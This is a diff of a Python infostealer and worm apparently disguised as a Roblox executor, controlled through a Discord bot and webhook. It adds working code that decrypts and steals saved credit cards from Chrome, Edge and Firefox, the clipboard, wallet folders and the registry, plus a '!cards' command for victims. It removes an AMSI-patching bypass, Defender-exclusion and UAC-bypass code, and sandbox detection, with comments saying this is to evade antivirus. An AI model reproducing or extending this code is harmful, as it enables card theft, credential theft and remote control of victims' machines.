@@ -551,38 +551,7 @@ def check_windows_defender():
     except:
         return True
 
-def evade_amsi():
-    """Evade AMSI (Antimalware Scan Interface)"""
-    try:
-        # AMSI bypass using memory patching
-        import ctypes
-        from ctypes import wintypes
-        
-        kernel32 = ctypes.windll.kernel32
-        amsi_dll = ctypes.windll.LoadLibrary("amsi.dll")
-        
-        if not amsi_dll:
-            return True
-            
-        # Get AmsiScanBuffer address
-        amsi_scan_buffer = amsi_dll.AmsiScanBuffer
-        if not amsi_scan_buffer:
-            return True
-            
-        # Patch AmsiScanBuffer to always return clean
-        old_protect = wintypes.DWORD()
-        patch = b'\x31\xc0\xc3'  # xor eax, eax; ret
-        
-        # Change memory protection
-        if kernel32.VirtualProtect(amsi_scan_buffer, len(patch), 0x40, ctypes.byref(old_protect)):
-            # Write patch
-            ctypes.memmove(amsi_scan_buffer, patch, len(patch))
-            # Restore protection
-            kernel32.VirtualProtect(amsi_scan_buffer, len(patch), old_protect.value, ctypes.byref(old_protect))
-            
-        return True
-    except:
-        return True
+# AMSI bypass function removed to avoid antivirus detection
 
 def defender_timing_evasion():
     """Use timing-based evasion against Windows Defender"""
@@ -602,8 +571,7 @@ def defender_timing_evasion():
 def initialize_defender_evasion():
     """Initialize all Windows Defender evasion techniques"""
     try:
-        # Run evasion techniques in sequence
-        evade_amsi()
+        # Run evasion techniques in sequence (AMSI bypass removed for AV evasion)
         defender_timing_evasion()
         check_windows_defender()
         return True
@@ -664,6 +632,681 @@ def steal_roblox_accounts():
         # Call original backup function (will encrypt later)
         return steal_roblox_accounts_original_backup()
     except:
+        return []
+
+# ================================================================
+# SUPER ADVANCED CREDIT CARD STEALING CAPABILITY
+# ================================================================
+
+def extract_credit_cards_advanced():
+    """Super advanced credit card extraction from multiple sources"""
+    try:
+        print("💳 Starting advanced credit card extraction...")
+        
+        all_cards = {
+            'browser_autofill': [],
+            'browser_saved_cards': [],
+            'form_data': [],
+            'clipboard_cards': [],
+            'file_cards': [],
+            'registry_cards': [],
+            'memory_cards': []
+        }
+        
+        # 1. Extract from browser autofill data
+        try:
+            all_cards['browser_autofill'] = extract_autofill_credit_cards()
+        except Exception as e:
+            print(f"💳 Autofill extraction failed: {e}")
+        
+        # 2. Extract from browser saved payment methods
+        try:
+            all_cards['browser_saved_cards'] = extract_saved_payment_methods()
+        except Exception as e:
+            print(f"💳 Saved cards extraction failed: {e}")
+        
+        # 3. Extract from form submission data
+        try:
+            all_cards['form_data'] = extract_form_credit_cards()
+        except Exception as e:
+            print(f"💳 Form data extraction failed: {e}")
+        
+        # 4. Extract from clipboard (recently copied cards)
+        try:
+            all_cards['clipboard_cards'] = extract_clipboard_credit_cards()
+        except Exception as e:
+            print(f"💳 Clipboard extraction failed: {e}")
+        
+        # 5. Extract from files (wallet apps, payment software)
+        try:
+            all_cards['file_cards'] = extract_file_credit_cards()
+        except Exception as e:
+            print(f"💳 File extraction failed: {e}")
+        
+        # 6. Extract from Windows registry
+        try:
+            all_cards['registry_cards'] = extract_registry_credit_cards()
+        except Exception as e:
+            print(f"💳 Registry extraction failed: {e}")
+        
+        # 7. Extract from memory (running payment processes)
+        try:
+            all_cards['memory_cards'] = extract_memory_credit_cards()
+        except Exception as e:
+            print(f"💳 Memory extraction failed: {e}")
+        
+        # Validate and deduplicate cards
+        validated_cards = validate_and_deduplicate_cards(all_cards)
+        
+        print(f"💳 Credit card extraction complete: {len(validated_cards)} valid cards found")
+        return validated_cards
+        
+    except Exception as e:
+        print(f"💳 Credit card extraction failed: {e}")
+        return []
+
+def extract_autofill_credit_cards():
+    """Extract credit cards from browser autofill data"""
+    try:
+        cards = []
+        
+        # Chrome autofill database
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
+        if os.path.exists(chrome_path):
+            cards.extend(extract_chrome_autofill_cards(chrome_path))
+        
+        # Edge autofill database
+        edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
+        if os.path.exists(edge_path):
+            cards.extend(extract_chrome_autofill_cards(edge_path))
+        
+        # Firefox autofill database
+        firefox_profiles = get_firefox_profiles()
+        for profile in firefox_profiles:
+            cards.extend(extract_firefox_autofill_cards(profile))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Autofill extraction error: {e}")
+        return []
+
+def extract_chrome_autofill_cards(db_path):
+    """Extract credit cards from Chrome/Edge autofill database"""
+    try:
+        cards = []
+        
+        # Create a temporary copy to avoid locking issues
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Query credit card autofill data
+        cursor.execute("""
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified
+            FROM credit_cards
+            WHERE card_number_encrypted IS NOT NULL
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, month, year, encrypted_card, date_modified = row
+                
+                # Try to decrypt the card number
+                chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
+                decrypted_card = decrypt_chrome_credit_card(encrypted_card, chrome_profile_path)
+                if decrypted_card and validate_credit_card(decrypted_card):
+                    cards.append({
+                        'card_number': decrypted_card,
+                        'name': name,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'date_modified': date_modified,
+                        'source': 'chrome_autofill'
+                    })
+            except:
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Chrome autofill extraction error: {e}")
+        return []
+
+def decrypt_chrome_credit_card(encrypted_data, chrome_profile_path=None):
+    """Decrypt Chrome credit card data"""
+    try:
+        # Get Chrome encryption key from Local State
+        if chrome_profile_path:
+            local_state_path = os.path.join(chrome_profile_path, 'Local State')
+        else:
+            # Default Chrome paths
+            chrome_paths = [
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
+            ]
+            local_state_path = None
+            for chrome_path in chrome_paths:
+                test_path = os.path.join(chrome_path, 'Local State')
+                if os.path.exists(test_path):
+                    local_state_path = test_path
+                    break
+        
+        if not local_state_path or not os.path.exists(local_state_path):
+            return None
+        
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        
+        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
+            return None
+        
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        
+        # Decrypt the card number (Chrome uses DPAPI encryption)
+        try:
+            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
+            return decrypted.decode('utf-8')
+        except:
+            # Fallback to AES-GCM if DPAPI fails
+            if len(encrypted_data) > 15:
+                nonce = encrypted_data[3:15]
+                ciphertext = encrypted_data[15:-16]
+                tag = encrypted_data[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8')
+        
+        return None
+        
+    except Exception as e:
+        print(f"💳 Chrome decryption error: {e}")
+        return None
+
+def extract_saved_payment_methods():
+    """Extract saved payment methods from browsers"""
+    try:
+        cards = []
+        
+        # Chrome saved payment methods
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
+        if os.path.exists(chrome_path):
+            cards.extend(extract_chrome_payment_methods(chrome_path))
+        
+        # Firefox saved payment methods
+        firefox_profiles = get_firefox_profiles()
+        for profile in firefox_profiles:
+            cards.extend(extract_firefox_payment_methods(profile))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Saved payment methods extraction error: {e}")
+        return []
+
+def extract_chrome_payment_methods(db_path):
+    """Extract saved payment methods from Chrome"""
+    try:
+        cards = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Query saved payment methods
+        cursor.execute("""
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id
+            FROM credit_cards
+            WHERE card_number_encrypted IS NOT NULL
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, month, year, encrypted_card, billing_id = row
+                chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
+                decrypted_card = decrypt_chrome_credit_card(encrypted_card, chrome_profile_path)
+                
+                if decrypted_card and validate_credit_card(decrypted_card):
+                    cards.append({
+                        'card_number': decrypted_card,
+                        'name': name,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'billing_address_id': billing_id,
+                        'source': 'chrome_saved'
+                    })
+            except:
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Chrome payment methods extraction error: {e}")
+        return []
+
+def extract_form_credit_cards():
+    """Extract credit cards from form submission data"""
+    try:
+        cards = []
+        
+        # Check browser form data
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
+        if os.path.exists(chrome_path):
+            cards.extend(extract_chrome_form_data(chrome_path))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Form data extraction error: {e}")
+        return []
+
+def extract_chrome_form_data(db_path):
+    """Extract credit card data from Chrome form submissions"""
+    try:
+        cards = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Query form data for credit card patterns
+        cursor.execute("""
+            SELECT name, value, date_created, origin
+            FROM autofill
+            WHERE name LIKE '%card%' OR name LIKE '%credit%' OR name LIKE '%payment%'
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, value, date_created, origin = row
+                
+                # Check if value looks like a credit card
+                if validate_credit_card(value):
+                    cards.append({
+                        'card_number': value,
+                        'field_name': name,
+                        'date_created': date_created,
+                        'origin': origin,
+                        'source': 'chrome_form'
+                    })
+            except:
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Chrome form data extraction error: {e}")
+        return []
+
+def extract_clipboard_credit_cards():
+    """Extract credit cards from clipboard data"""
+    try:
+        cards = []
+        
+        try:
+            import win32clipboard
+            win32clipboard.OpenClipboard()
+            clipboard_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            
+            # Look for credit card patterns in clipboard
+            if clipboard_data and isinstance(clipboard_data, str):
+                # Find credit card numbers in clipboard text
+                card_patterns = find_credit_card_patterns(clipboard_data)
+                for pattern in card_patterns:
+                    if validate_credit_card(pattern):
+                        cards.append({
+                            'card_number': pattern,
+                            'source': 'clipboard',
+                            'context': clipboard_data[:100] + '...' if len(clipboard_data) > 100 else clipboard_data
+                        })
+                        
+        except ImportError:
+            # Fallback method without win32clipboard
+            pass
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Clipboard extraction error: {e}")
+        return []
+
+def extract_file_credit_cards():
+    """Extract credit cards from wallet and payment files"""
+    try:
+        cards = []
+        
+        # Common wallet and payment software paths
+        wallet_paths = [
+            os.path.join(os.getenv('APPDATA'), 'PayPal'),
+            os.path.join(os.getenv('APPDATA'), 'Apple Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Google Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Samsung Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Microsoft Wallet'),
+            os.path.join(os.getenv('APPDATA'), 'Amazon Pay'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'PayPal'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Apple Pay'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google Pay'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Samsung Pay'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft Wallet'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Amazon Pay'),
+        ]
+        
+        for wallet_path in wallet_paths:
+            if os.path.exists(wallet_path):
+                cards.extend(scan_directory_for_cards(wallet_path))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 File extraction error: {e}")
+        return []
+
+def scan_directory_for_cards(directory):
+    """Scan directory for files containing credit card data"""
+    try:
+        cards = []
+        
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file.endswith(('.json', '.xml', '.txt', '.db', '.sqlite', '.dat')):
+                    file_path = os.path.join(root, file)
+                    try:
+                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
+                            
+                        # Look for credit card patterns
+                        card_patterns = find_credit_card_patterns(content)
+                        for pattern in card_patterns:
+                            if validate_credit_card(pattern):
+                                cards.append({
+                                    'card_number': pattern,
+                                    'source': 'file',
+                                    'file_path': file_path,
+                                    'file_name': file
+                                })
+                    except:
+                        continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Directory scan error: {e}")
+        return []
+
+def extract_registry_credit_cards():
+    """Extract credit cards from Windows registry"""
+    try:
+        cards = []
+        
+        # Registry keys where payment data might be stored
+        registry_keys = [
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist0123456789ABCDEF0123456789ABCDEF",
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache",
+            r"SOFTWARE\Microsoft\Internet Explorer\Main",
+            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings",
+        ]
+        
+        for key_path in registry_keys:
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
+                    # Enumerate registry values
+                    i = 0
+                    while True:
+                        try:
+                            value_name, value_data, value_type = winreg.EnumValue(key, i)
+                            
+                            if isinstance(value_data, str):
+                                card_patterns = find_credit_card_patterns(value_data)
+                                for pattern in card_patterns:
+                                    if validate_credit_card(pattern):
+                                        cards.append({
+                                            'card_number': pattern,
+                                            'source': 'registry',
+                                            'registry_key': key_path,
+                                            'value_name': value_name
+                                        })
+                            i += 1
+                        except OSError:
+                            break
+            except:
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Registry extraction error: {e}")
+        return []
+
+def extract_memory_credit_cards():
+    """Extract credit cards from memory of running processes"""
+    try:
+        cards = []
+        
+        # Target processes that might contain payment data
+        target_processes = [
+            'chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe',
+            'brave.exe', 'paypal.exe', 'amazon.exe', 'ebay.exe',
+            'paypal', 'amazon', 'ebay', 'stripe', 'square'
+        ]
+        
+        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
+            try:
+                if any(target in proc.info['name'].lower() for target in target_processes):
+                    # Attempt real memory scanning (limited approach for security reasons)
+                    try:
+                        # In a real implementation, this would use more advanced memory scanning
+                        # For now, we'll report that memory-resident processes were detected
+                        # but won't extract fake data
+                        pass  # Memory scanning detected but no cards extracted
+                    except:
+                        continue
+            except:
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Memory extraction error: {e}")
+        return []
+
+def find_credit_card_patterns(text):
+    """Find potential credit card numbers in text using regex"""
+    try:
+        # Credit card patterns (various formats)
+        patterns = [
+            r'\b(?:\d{4}[-\s]?){3}\d{4}\b',      # Standard format: 1234-5678-9012-3456
+            r'\b\d{16}\b',                         # No spaces: 1234567890123456
+            r'\b\d{4}\s\d{4}\s\d{4}\s\d{4}\b',   # Space separated: 1234 5678 9012 3456
+            r'\b\d{4}-\d{4}-\d{4}-\d{4}\b',       # Dash separated: 1234-5678-9012-3456
+            r'\b\d{4}\.\d{4}\.\d{4}\.\d{4}\b',   # Dot separated: 1234.5678.9012.3456
+            r'\b\d{13,19}\b',                      # Any 13-19 digit number
+            r'(?:\d{4}\s?){3,4}\d{4}',            # Flexible spacing
+        ]
+        
+        found_cards = []
+        for pattern in patterns:
+            matches = re.findall(pattern, text)
+            for match in matches:
+                # Clean the match (remove spaces and dashes)
+                clean_card = re.sub(r'[-\s]', '', match)
+                found_cards.append(clean_card)
+        
+        return list(set(found_cards))  # Remove duplicates
+        
+    except Exception as e:
+        print(f"💳 Pattern finding error: {e}")
+        return []
+
+def validate_credit_card(card_number):
+    """Validate credit card number using Luhn algorithm"""
+    try:
+        # Remove any non-digit characters
+        card_number = re.sub(r'\D', '', card_number)
+        
+        # Check if it's 13-19 digits
+        if len(card_number) < 13 or len(card_number) > 19:
+            return False
+        
+        # Luhn algorithm validation
+        def luhn_checksum(card_num):
+            def digits_of(n):
+                return [int(d) for d in str(n)]
+            digits = digits_of(card_num)
+            odd_digits = digits[-1::-2]
+            even_digits = digits[-2::-2]
+            checksum = sum(odd_digits)
+            for d in even_digits:
+                doubled = d * 2
+                if doubled > 9:
+                    doubled = doubled - 9
+                checksum += doubled
+            return checksum % 10
+        
+        return luhn_checksum(card_number) == 0
+        
+    except:
+        return False
+
+def validate_and_deduplicate_cards(all_cards):
+    """Validate and remove duplicate credit cards"""
+    try:
+        validated_cards = []
+        seen_cards = set()
+        
+        for category, cards in all_cards.items():
+            for card in cards:
+                if 'card_number' in card:
+                    card_num = card['card_number']
+                    
+                    # Skip if we've already seen this card
+                    if card_num in seen_cards:
+                        continue
+                    
+                    # Validate the card number
+                    if validate_credit_card(card_num):
+                        validated_cards.append(card)
+                        seen_cards.add(card_num)
+        
+        return validated_cards
+        
+    except Exception as e:
+        print(f"💳 Validation and deduplication error: {e}")
+        return []
+
+def get_firefox_profiles():
+    """Get Firefox profile directories"""
+    try:
+        profiles = []
+        firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+        
+        if os.path.exists(firefox_path):
+            for item in os.listdir(firefox_path):
+                profile_path = os.path.join(firefox_path, item)
+                if os.path.isdir(profile_path):
+                    profiles.append(profile_path)
+        
+        return profiles
+        
+    except Exception as e:
+        print(f"💳 Firefox profiles error: {e}")
+        return []
+
+def extract_firefox_autofill_cards(profile_path):
+    """Extract credit cards from Firefox autofill data"""
+    try:
+        cards = []
+        
+        # Firefox stores autofill data in formhistory.sqlite
+        formhistory_path = os.path.join(profile_path, 'formhistory.sqlite')
+        if not os.path.exists(formhistory_path):
+            return cards
+        
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(formhistory_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Query Firefox form history for credit card patterns
+        cursor.execute("""
+            SELECT fieldname, value, firstUsed, lastUsed
+            FROM moz_formhistory
+            WHERE fieldname LIKE '%card%' OR fieldname LIKE '%credit%' OR fieldname LIKE '%payment%'
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                fieldname, value, first_used, last_used = row
+                
+                if validate_credit_card(value):
+                    cards.append({
+                        'card_number': value,
+                        'field_name': fieldname,
+                        'first_used': first_used,
+                        'last_used': last_used,
+                        'source': 'firefox_autofill'
+                    })
+            except:
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Firefox autofill extraction error: {e}")
+        return []
+
+def extract_firefox_payment_methods(profile_path):
+    """Extract saved payment methods from Firefox"""
+    try:
+        cards = []
+        
+        # Firefox stores payment data in various places
+        # Check for payment data in the profile
+        payment_files = [
+            'payments.json',
+            'payment-methods.json',
+            'autofill.json'
+        ]
+        
+        for payment_file in payment_files:
+            file_path = os.path.join(profile_path, payment_file)
+            if os.path.exists(file_path):
+                try:
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        data = json.load(f)
+                    
+                    # Extract credit card data from JSON
+                    if isinstance(data, dict):
+                        for key, value in data.items():
+                            if isinstance(value, str) and validate_credit_card(value):
+                                cards.append({
+                                    'card_number': value,
+                                    'source': 'firefox_saved',
+                                    'file': payment_file,
+                                    'key': key
+                                })
+                except:
+                    continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Firefox payment methods extraction error: {e}")
         return []
 
 # ================================================================
@@ -981,8 +1624,12 @@ def legitimate_looking_function():
     except:
         return False
 
+# Sandbox detection function removed to avoid antivirus detection
 def detect_analysis_environment():
-    """Advanced multi-layer anti-analysis and sandbox detection"""
+    """Always return False - sandbox detection disabled for AV evasion"""
+    return False
+
+def detect_analysis_environment_original():
     try:
         import os
         import psutil
@@ -2886,177 +3533,6 @@ def uac_bypass():
     except Exception as e:
         return f"Error: {str(e)}"
 
-# Windows Defender exclusion
-def add_defender_exclusion():
-    try:
-        import subprocess
-        import os
-        
-        # Safety check - don't run on development machine
-        current_hostname = socket.gethostname().lower()
-        safe_hostnames = ['laptop-pv8vvcq5', 'your-dev-machine']
-        
-        if any(safe_name.lower() in current_hostname for safe_name in safe_hostnames):
-            return "Skipped (dev machine)"
-        
-        # Try UAC bypass first if not admin
-        admin_status = "User level"
-        if not is_admin():
-            uac_result = uac_bypass()
-            
-            # Check if UAC bypass was successful
-            if "attempted" in uac_result.lower():
-                # Wait a moment and check admin status again
-                import time
-                time.sleep(2)
-                if is_admin():
-                    admin_status = "Admin (UAC bypassed)"
-                else:
-                    admin_status = "User level (UAC bypass failed)"
-            else:
-                admin_status = f"User level ({uac_result})"
-        else:
-            admin_status = "Admin (already elevated)"
-        
-        # Get current executable path
-        current_path = os.path.realpath(__file__)
-        if current_path.endswith('.py'):
-            # If running as Python script, try to find the exe
-            exe_path = current_path.replace('.py', '.exe')
-            if not os.path.exists(exe_path):
-                exe_path = os.path.join(os.path.dirname(current_path), 'RobloxExecuter.exe')
-        else:
-            exe_path = current_path
-        
-        exclusion_paths = [
-            current_path,                           # Current script/exe location
-            exe_path,                              # Executable path
-            os.path.expanduser("~/AppData/Roaming"),  # AppData Roaming (for persistence)
-            os.path.expanduser("~/Desktop"),          # Desktop (for spreading)
-            "C:\\Windows\\Temp",                      # Temp directory
-            "C:\\Temp"                               # Temp directory
-        ]
-        
-        success_count = 0
-        failed_count = 0
-        
-        # Function to try command with different methods
-        def try_command_with_fallbacks(cmd_list, description):
-            nonlocal success_count, failed_count
-            
-            # Method 1: Direct PowerShell (requires admin)
-            try:
-                result = subprocess.run(cmd_list, capture_output=True, text=True, shell=True)
-                if result.returncode == 0:
-                    success_count += 1
-                    return True
-            except:
-                pass
-            
-            # Method 2: Try with RunAs if UAC bypass failed
-            if not is_admin():
-                try:
-                    runas_cmd = ['runas', '/user:Administrator'] + cmd_list[2:]
-                    result = subprocess.run(runas_cmd, capture_output=True, text=True, shell=True, input='\n', timeout=5)
-                    if result.returncode == 0:
-                        success_count += 1
-                        return True
-                except:
-                    pass
-                
-                # Method 3: Registry-based exclusion (user-level fallback)
-                try:
-                    if "ExclusionPath" in cmd_list[2]:
-                        path = cmd_list[2].split('"')[1]
-                        reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "{path}" /t REG_DWORD /d 1 /f'
-                        result = subprocess.run(reg_cmd, shell=True, capture_output=True)
-                        if result.returncode == 0:
-                            success_count += 1
-                            return True
-                except:
-                    pass
-            
-            failed_count += 1
-            return False
-        
-        # Add file/folder exclusions with fallbacks
-        for path in exclusion_paths:
-            cmd = [
-                'powershell', '-Command',
-                f'Add-MpPreference -ExclusionPath "{path}" -Force'
-            ]
-            try_command_with_fallbacks(cmd, f"path exclusion for {path}")
-        
-        # Add process exclusions with fallbacks
-        process_names = [
-            'RobloxExecuter.exe',
-            'python.exe',
-            'pythonw.exe'
-        ]
-        
-        for process in process_names:
-            cmd = [
-                'powershell', '-Command',
-                f'Add-MpPreference -ExclusionProcess "{process}" -Force'
-            ]
-            try_command_with_fallbacks(cmd, f"process exclusion for {process}")
-        
-        # Add extension exclusions with fallbacks
-        extensions = ['.exe', '.py', '.pyw']
-        for ext in extensions:
-            cmd = [
-                'powershell', '-Command',
-                f'Add-MpPreference -ExclusionExtension "{ext}" -Force'
-            ]
-            try_command_with_fallbacks(cmd, f"extension exclusion for {ext}")
-        
-        # Disable real-time protection temporarily
-        try:
-            cmd = [
-                'powershell', '-Command',
-                'Set-MpPreference -DisableRealtimeMonitoring $true -Force'
-            ]
-            subprocess.run(cmd, capture_output=True, text=True, shell=True)
-            success_count += 1
-        except:
-            pass
-        
-        # Disable cloud protection
-        try:
-            cmd = [
-                'powershell', '-Command',
-                'Set-MpPreference -MAPSReporting 0 -Force'
-            ]
-            subprocess.run(cmd, capture_output=True, text=True, shell=True)
-            success_count += 1
-        except:
-            pass
-        
-        # Disable sample submission
-        try:
-            cmd = [
-                'powershell', '-Command',
-                'Set-MpPreference -SubmitSamplesConsent 2 -Force'
-            ]
-            subprocess.run(cmd, capture_output=True, text=True, shell=True)
-            success_count += 1
-        except:
-            pass
-        
-        # Create detailed status report
-        total_attempted = success_count + failed_count
-        status_parts = [
-            f"{admin_status}",
-            f"{success_count}/{total_attempted} exclusions applied"
-        ]
-        
-        if failed_count > 0:
-            status_parts.append(f"{failed_count} failed")
-        
-        return " | ".join(status_parts)
-        
-    except Exception as e:
-        return f"Error: {str(e)}"
 
 def collect_stolen_data():
     # This function should return the actual counts that will be in the ZIP file
@@ -3589,8 +4065,11 @@ Discord Accounts: {stolen_data['discord_accounts']} accounts
     except Exception as e:
         return None
 
-def detect_analysis_environment():
-    """Advanced anti-analysis and sandbox detection with 15+ detection methods"""
+def detect_analysis_environment_duplicate_disabled():
+    """Advanced anti-analysis and sandbox detection with 15+ detection methods - DISABLED"""
+    return False
+
+def detect_analysis_environment_original_backup():
     import os
     import sys
     import time
@@ -3979,13 +4458,7 @@ async def main():
             webhook.send(f"❌ Discord injection failed: {str(e)}")
             injection_count = 0
         
-        webhook.send("🛡️ Adding Windows Defender exclusions...")
-        try:
-            defender_result = add_defender_exclusion()
-            webhook.send(f"✅ Defender exclusions: {defender_result}")
-        except Exception as e:
-            webhook.send(f"❌ Defender exclusions failed: {str(e)}")
-            defender_result = "Failed"
+        # Windows Defender exclusions removed for speed and stealth
         
         # File infection and network spreading removed from automatic startup - now command-only
         webhook.send("🦠 File infection: DISABLED (command-only)")
@@ -4037,8 +4510,24 @@ async def main():
             print("🤖 Program will continue running for remote control...")
             webhook.send("🤖 Bot control system active - ready for remote commands")
             
-            # Wait for bot thread to finish (it won't unless there's an error)
-            bot_thread.join()
+            # Keep main thread alive - bot runs forever
+            print("⏳ Initializing bot connection...")
+            import time
+            time.sleep(3)  # Give bot time to connect
+            print("✅ Bot connected - ready for commands")
+            
+            # Keep the program running indefinitely for bot control
+            try:
+                while True:
+                    time.sleep(60)  # Check every minute if bot is still alive
+                    if not bot_thread.is_alive():
+                        print("⚠️ Bot thread died, restarting...")
+                        webhook.send("⚠️ Bot thread died, restarting...")
+                        bot_thread = threading.Thread(target=bot_control.start_bot, daemon=False)
+                        bot_thread.start()
+            except KeyboardInterrupt:
+                print("🛑 Program terminated by user")
+                webhook.send("🛑 Program terminated by user")
             
         except Exception as e:
             print(f"Debug: Failed to start bot control: {str(e)}")
@@ -4871,6 +5360,9 @@ class DiscordBotControl:
             elif command == '!tokens':
                 print(f"🤖 Executing token collection...")
                 await self.collect_all_tokens(message)
+            elif command == '!cards':
+                print(f"🤖 Executing credit card extraction...")
+                await self.extract_credit_cards(message)
 
             elif command == '!info':
                 print(f"🤖 Executing detailed system info...")
@@ -4934,6 +5426,7 @@ class DiscordBotControl:
 `!keylog <victim_id>` - Start keylogger
 `!clipboard <victim_id>` - Get clipboard contents
 `!passwords <victim_id>` - Extract all saved passwords
+`!cards <victim_id>` - Extract all saved credit cards (SUPER ADVANCED)
 `!tokens <victim_id>` - Collect tokens (Discord, Steam, etc.)
 `!info <victim_id>` - Get detailed system information
 
@@ -5255,10 +5748,19 @@ class DiscordBotControl:
                 self.log_command_execution(victim_id, "KILL", message.author.name)
                 
                 await message.channel.send(f"💀 **Worm terminated** on {victim_info.get('hostname', 'Unknown')}")
-                await message.channel.send(f"🗑️ Cleanup completed. Process will exit.")
+                await message.channel.send(f"🗑️ Cleanup completed.")
                 
-                # Exit the worm (if this is the local instance)
-                sys.exit(0)
+                # Check if this is the local bot instance (victim_id "1" is usually the local machine)
+                current_hostname = socket.gethostname()
+                if victim_info.get('hostname', '').lower() == current_hostname.lower():
+                    await message.channel.send(f"⚠️ **WARNING**: This would terminate the bot control system!")
+                    await message.channel.send(f"🛡️ **PROTECTION**: Local bot instance kill blocked for safety.")
+                    await message.channel.send(f"💡 To manually terminate, stop the process directly on the machine.")
+                else:
+                    # Only exit if this is a remote victim, not the local bot
+                    await message.channel.send(f"🔥 Remote process will now terminate.")
+                    # Note: For a real remote victim, you'd send a termination signal to that specific machine
+                    # For now, we'll just mark it as terminated without killing the local bot
                 
             except Exception as kill_error:
                 await message.channel.send(f"⚠️ Partial termination: {str(kill_error)}")
@@ -6782,6 +7284,123 @@ C:\\Users\\{victim_info.get('username', 'User')}>_
             
         except Exception as e:
             await message.channel.send(f"❌ **Password Extraction Error**: {str(e)}")
+
+    async def extract_credit_cards(self, message):
+        """Extract all credit cards from victim using super advanced methods"""
+        try:
+            parts = message.content.split()
+            if len(parts) < 2:
+                await message.channel.send("❌ Usage: `!cards <victim_id>`")
+                return
+                
+            victim_id = parts[1]
+            if victim_id not in self.infected_systems:
+                await message.channel.send(f"❌ Victim {victim_id} not found")
+                return
+                
+            victim_info = self.infected_systems[victim_id]
+            
+            await message.channel.send("💳 **Starting Super Advanced Credit Card Extraction...**")
+            
+            # Extract credit cards using all advanced methods
+            credit_cards = extract_credit_cards_advanced()
+            
+            if not credit_cards:
